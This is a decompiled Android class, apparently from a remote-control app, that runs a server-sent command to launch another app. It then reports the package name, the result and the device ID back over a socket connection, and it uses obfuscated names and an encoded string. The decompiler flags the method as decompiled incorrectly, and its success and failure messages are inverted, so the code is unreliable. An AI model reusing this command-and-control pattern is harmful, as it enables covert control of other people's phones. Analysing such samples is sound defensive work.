package com.storm.safe.rock.service.modules.command;

import android.content.Intent;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;
import p000.vk1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AppCommandHandler$handleLaunchApp$2", m214403f = "AppCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AppCommandHandler$handleLaunchApp$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ uz0 f53428a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53429a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0323a8 f53430a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AppCommandHandler$handleLaunchApp$2(uz0 uz0Var, String str, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53428a1 = uz0Var;
        this.f53429a2 = str;
        this.f53430a3 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AppCommandHandler$handleLaunchApp$2(this.f53428a1, this.f53429a2, this.f53430a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((AppCommandHandler$handleLaunchApp$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:14:0x0048 A[Catch: Exception -> 0x006a, TryCatch #0 {Exception -> 0x006a, blocks: (B:3:0x0014, B:12:0x0044, B:14:0x0048, B:18:0x006e, B:20:0x0077, B:19:0x0073, B:11:0x003c, B:4:0x001f, B:6:0x0027, B:9:0x0033), top: B:25:0x0014, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:18:0x006e A[Catch: Exception -> 0x006a, TryCatch #0 {Exception -> 0x006a, blocks: (B:3:0x0014, B:12:0x0044, B:14:0x0048, B:18:0x006e, B:20:0x0077, B:19:0x0073, B:11:0x003c, B:4:0x001f, B:6:0x0027, B:9:0x0033), top: B:25:0x0014, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0073 A[Catch: Exception -> 0x006a, TryCatch #0 {Exception -> 0x006a, blocks: (B:3:0x0014, B:12:0x0044, B:14:0x0048, B:18:0x006e, B:20:0x0077, B:19:0x0073, B:11:0x003c, B:4:0x001f, B:6:0x0027, B:9:0x0033), top: B:25:0x0014, inners: #1 }] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        dqtvuisjd dqtvuisjdVar;
        boolean z;
        C0323a8 c0323a8;
        Intent launchIntentForPackage;
        uz0 uz0Var = this.f53428a1;
        String str = this.f53429a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            dqtvuisjdVar = uz0Var.f60536a0;
            try {
                launchIntentForPackage = new vk1(dqtvuisjdVar).f60652a0.getLaunchIntentForPackage(str);
            } catch (Exception e) {
                t60.m214705c6("suqjzuageg", "启动应用失败: ".concat(str), e);
            }
        } catch (Exception e2) {
            t60.m214705c6("AppCmdHandler", "启动应用失败: ".concat(str), e2);
        }
        if (launchIntentForPackage == null) {
            t60.m214726f4("suqjzuageg", "无法获取启动Intent: ".concat(str));
            z = false;
            c0323a8 = this.f53430a3;
            if (c0323a8 != null) {
            }
            t60.m214714d6("AppCmdHandler", !z ? "应用启动成功: ".concat(str) : "应用启动失败: ".concat(str));
            return new Integer(0);
        }
        launchIntentForPackage.addFlags(268435456);
        dqtvuisjdVar.startActivity(launchIntentForPackage);
        z = true;
        c0323a8 = this.f53430a3;
        if (c0323a8 != null) {
            String strM212470a0 = StringUtil.m212470a0("J1gENE4wMy9HIRRLFCldNwI9Ug==");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("packageName", str);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, z);
            jSONObject.put("deviceId", uz0Var.f60536a0.m211470g4());
            c0323a8.m211658c4(strM212470a0, jSONObject);
        }
        t60.m214714d6("AppCmdHandler", !z ? "应用启动成功: ".concat(str) : "应用启动失败: ".concat(str));
        return new Integer(0);
    }
}
